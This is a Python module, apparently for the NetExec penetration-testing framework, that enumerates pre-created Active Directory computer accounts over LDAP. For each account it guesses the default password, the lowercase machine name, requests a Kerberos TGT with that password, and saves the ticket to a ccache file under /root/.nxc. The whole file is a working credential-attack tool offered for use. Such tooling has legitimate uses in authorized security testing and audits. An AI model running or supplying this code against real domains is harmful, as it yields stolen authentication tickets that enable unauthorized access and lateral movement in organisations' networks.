import os
from impacket.ldap import ldap, ldapasn1
from impacket.krb5.kerberosv5 import getKerberosTGT
from impacket.krb5.ccache import CCache
from impacket.krb5.types import Principal
from impacket.krb5 import constants
from binascii import unhexlify

class NXCModule:
    """
    Identify pre-created computer accounts, save the results to a file, and obtain TGTs for each pre-created computer account.
    Module by : @shad0wcntr0ller
    
    """
    name = 'pre2k'
    description = 'Identify pre-created computer accounts, save the results to a file, and obtain TGTs for each'
    supported_protocols = ['ldap']
    opsec_safe = True
    multiple_hosts = False

    def options(self, context, module_options):
        pass

    def on_login(self, context, connection):
        try:
            # Initialize connection to LDAP
            context.log.info(f"Connecting to LDAP server at ldap://{connection.host}")

            if connection.kerberos:
                ldap_connection = ldap.LDAPConnection(f'ldap://{connection.host}', connection.baseDN, None)
                ldap_connection.kerberosLogin(connection.username, connection.password, connection.domain, lmhash=connection.lmhash, nthash=connection.nthash, aesKey=connection.aesKey, kdcHost=connection.kdcHost)
            else:
                ldap_connection = ldap.LDAPConnection(f'ldap://{connection.host}', connection.baseDN, None)
                ldap_connection.login(connection.username, connection.password, connection.domain, lmhash=connection.lmhash, nthash=connection.nthash)

            # Define the search filter for pre-created computer accounts
            search_filter = '(&(objectClass=computer)(userAccountControl=4128))'
            attributes = ['sAMAccountName', 'userAccountControl', 'dNSHostName']

            context.log.info(f'Using search filter: {search_filter}')
            context.log.info(f'Attributes to retrieve: {attributes}')

            computers = []

            try:
                # Use paged search to retrieve all computer accounts with specific flags
                paged_search_control = ldapasn1.SimplePagedResultsControl(criticality=True, size=1000)
                search_results = ldap_connection.search(searchFilter=search_filter, attributes=attributes, searchControls=[paged_search_control])

                for item in search_results:
                    if isinstance(item, ldapasn1.SearchResultEntry):
                        context.log.debug(f'Raw item: {item.prettyPrint()}')

                        sam_account_name = None
                        user_account_control = None

                        for attribute in item['attributes']:
                            context.log.debug(f'Attribute: {attribute.prettyPrint()}')
                            if str(attribute['type']) == 'sAMAccountName':
                                sam_account_name = str(attribute['vals'][0])
                            elif str(attribute['type']) == 'userAccountControl':
                                user_account_control = str(attribute['vals'][0])

                        context.log.debug(f"Processing computer: {sam_account_name}, UAC: {user_account_control}")

                        if sam_account_name and user_account_control is not None:
                            user_account_control = int(user_account_control)

                            # Check if the account is a pre-created computer account
                            if user_account_control == 4128:  # 4096 | 32
                                computers.append(sam_account_name)
                                context.log.debug(f'Added computer: {sam_account_name}')

                # Save computers to file
                base_dir = '/root/.nxc/DiscoveredComputers'
                domain_dir = os.path.join(base_dir, connection.domain)
                output_file = os.path.join(domain_dir, 'precreated_computers.txt')

                # Create directories if they do not exist
                os.makedirs(domain_dir, exist_ok=True)

                with open(output_file, 'w') as file:
                    for computer in computers:
                        file.write(f'{computer}\n')

                # Print discovered pre-created computer accounts
                if computers:
                    for computer in computers:
                        context.log.highlight(f'Pre-created computer account: {computer}')
                    context.log.success(f'Found {len(computers)} pre-created computer accounts. Saved to {output_file}')
                else:
                    context.log.info(f'No pre-created computer accounts found.')

                # Obtain TGTs and save to ccache
                ccache_base_dir = '/root/.nxc/ccache'
                os.makedirs(ccache_base_dir, exist_ok=True)

                successful_tgts = 0

                for computer in computers:
                    machine_name = computer[:-1].lower()  # Remove trailing '$' and convert to lowercase
                    if self.get_tgt(context, machine_name, connection.domain, connection.kdcHost, ccache_base_dir):
                        successful_tgts += 1

                # Summary of TGT results
                context.log.success(f'Successfully obtained TGT for {successful_tgts} pre-created computer accounts. Saved to {ccache_base_dir}')

            except Exception as e:
                context.log.fail(f'Error occurred during search: {e}')

            ldap_connection.close()
            return True

        except Exception as e:
            context.log.fail(f'Error occurred during LDAP connection: {e}')
            return False

    def get_tgt(self, context, username, domain, kdcHost, ccache_base_dir):
        try:
            userName = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            password = username  # Password is the machine name in lowercase
            context.log.info(f"Getting TGT for {username}@{domain}")

            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                clientName=userName,
                password=password,
                domain=domain,
                lmhash='',
                nthash='',
                aesKey='',
                kdcHost=kdcHost,
                serverName=None
            )

            self.save_ticket(context, username, tgt, oldSessionKey, ccache_base_dir)
            context.log.success(f'Successfully obtained TGT for {username}@{domain}')
            return True
        except Exception as e:
            context.log.fail(f'Failed to get TGT for {username}@{domain}: {e}')
            return False

    def save_ticket(self, context, username, ticket, sessionKey, ccache_base_dir):
        try:
            ccache = CCache()
            ccache.fromTGT(ticket, sessionKey, sessionKey)
            ccache_filename = os.path.join(ccache_base_dir, f'{username}.ccache')
            ccache.saveFile(ccache_filename)
            context.log.info(f'Saved ticket in {ccache_filename}')
        except Exception as e:
            context.log.fail(f'Failed to save ticket for {username}: {e}')

